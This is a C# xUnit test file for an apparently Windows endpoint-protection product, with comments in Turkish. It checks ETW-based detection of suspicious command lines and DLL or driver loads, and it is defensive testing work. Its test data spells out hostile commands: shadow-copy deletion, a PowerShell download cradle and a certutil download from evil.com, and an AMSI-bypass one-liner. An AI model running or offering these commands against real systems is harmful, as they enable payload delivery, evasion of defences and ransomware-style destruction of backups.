using System;
using System.IO;
using AegisPC.Service.RealTime;
using Xunit;

namespace AegisPC.Tests
{
    /// <summary>
    /// Event Tracing for Windows (ETW) Süreç ve Görüntü (Process / ImageLoad) izleme test paketi.
    /// ProcessStart, ProcessExit, ImageLoad (DLL Injection / LOLBAS) telemetrilerini ve
    /// 256 MB döngüsel tampon (circular buffer) oturum yapılandırmasını test eder.
    /// </summary>
    public class EtwMonitorTest
    {
        [Theory]
        [InlineData("cmd.exe", "vssadmin.exe delete shadows /all /quiet", "VSS Shadow Copy Deletion")]
        [InlineData("cmd.exe", "wmic shadowcopy delete", "WMI Shadow Copy Deletion")]
        [InlineData("cmd.exe", "bcdedit /set {default} recoveryenabled no", "Boot Recovery Disabled")]
        [InlineData("powershell.exe", "powershell -enc SQBFAFgA", "Encoded PowerShell Command")]
        [InlineData("powershell.exe", "powershell.exe (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')", "PowerShell In-Memory Payload")]
        [InlineData("powershell.exe", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", "AMSI Tampering")]
        [InlineData("certutil.exe", "certutil -urlcache -split -f http://evil.com/drop.exe drop.exe", "CertUtil Remote Binary Download")]
        public void EtwProcessMonitor_CheckSuspiciousCommandLine_DetectsRansomwareAndLolbas(
            string imagePath,
            string commandLine,
            string expectedThreatSubstr)
        {
            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(imagePath, commandLine, out string reason);

            Assert.True(detected, $"Şüpheli komut satırı ETW filtresi tarafından tespit edilmelidir: {commandLine}");
            Assert.Contains(expectedThreatSubstr, reason, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void EtwProcessMonitor_CheckSuspiciousCommandLine_DetectsProcessMasquerading()
        {
            // svchost.exe System32 dışında (örneğin Temp veya Users dizininde) çalıştırılırsa masquerading tespit edilmeli
            string fakeSvchost = @"C:\Users\Public\Downloads\svchost.exe";
            string cmd = "svchost.exe -k netsvcs";

            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(fakeSvchost, cmd, out string reason);

            Assert.True(detected, "System32 dışından çalışan svchost.exe sahteciliği tespit edilmelidir.");
            Assert.Contains("Masquerading", reason);
        }

        [Theory]
        [InlineData(@"C:\Windows\System32\notepad.exe", "notepad.exe C:\\my_notes.txt")]
        [InlineData(@"C:\Program Files\Git\bin\git.exe", "git.exe commit -m \"fix issue\"")]
        [InlineData(@"C:\Windows\explorer.exe", "explorer.exe")]
        [InlineData(@"C:\Program Files\dotnet\dotnet.exe", "dotnet.exe build")]
        public void EtwProcessMonitor_CheckSuspiciousCommandLine_AllowsBenignAdministrativeCommands(
            string imagePath,
            string commandLine)
        {
            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(imagePath, commandLine, out string reason);

            Assert.False(detected, $"Meşru komut satırına sahte alarm verilmemelidir: {commandLine}");
            Assert.Empty(reason);
        }

        [Theory]
        [InlineData(1234, @"C:\Windows\Temp\malicious_hook.dll", true, "Temp")]
        [InlineData(2345, @"C:\Users\PC\AppData\Local\Temp\evil_payload.dll", true, "Temp")]
        [InlineData(4, @"C:\Drivers\RTCore64.sys", true, "BYOVD")]
        [InlineData(4, @"C:\Drivers\mhyprot2.sys", true, "BYOVD")]
        [InlineData(1234, @"C:\Windows\System32\kernel32.dll", false, "")]
        [InlineData(5678, @"C:\Windows\System32\user32.dll", false, "")]
        public void EtwImageLoadMonitor_CheckSuspiciousImageLoad_DetectsInjectionAndByovd(
            int pid,
            string imagePath,
            bool expectedSuspicious,
            string expectedReasonKeyword)
        {
            bool isSuspicious = EtwImageLoadMonitor.CheckSuspiciousImageLoad(pid, imagePath, out string reason);

            Assert.Equal(expectedSuspicious, isSuspicious);
            if (expectedSuspicious)
            {
                Assert.Contains(expectedReasonKeyword, reason, StringComparison.OrdinalIgnoreCase);
            }
        }

        [Fact]
        public void EtwProcessMonitor_ConfigurationAndSessionDefaults_AreCorrect()
        {
            Assert.Equal("AegisPCEtwSession", EtwProcessMonitor.DefaultSessionName);
            Assert.Equal(@"C:\ProgramData\UltronDefender\EtwLogs", EtwProcessMonitor.DefaultLogDirectory);
            Assert.Equal(new Guid("22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716"), EtwProcessMonitor.KernelProcessProviderGuid);

            Assert.Equal("AegisPCEtwSession_ImageLoad", EtwImageLoadMonitor.DefaultSessionName);
        }

        [Fact]
        public void EtwProcessMonitor_TelemetryModel_PopulatesCorrectly()
        {
            var telemetry = new ProcessStartTelemetry
            {
                ProcessId = 5544,
                ParentProcessId = 1200,
                ImageFileName = @"C:\Windows\System32\cmd.exe",
                CommandLine = "cmd.exe /c whoami",
                TimestampUtc = DateTime.UtcNow,
                IsSuspiciousLolbas = false,
                ThreatReason = string.Empty
            };

            Assert.Equal(5544, telemetry.ProcessId);
            Assert.Equal(1200, telemetry.ParentProcessId);
            Assert.Equal(@"C:\Windows\System32\cmd.exe", telemetry.ImageFileName);
            Assert.Equal("cmd.exe /c whoami", telemetry.CommandLine);
            Assert.False(telemetry.IsSuspiciousLolbas);
        }
    }
}
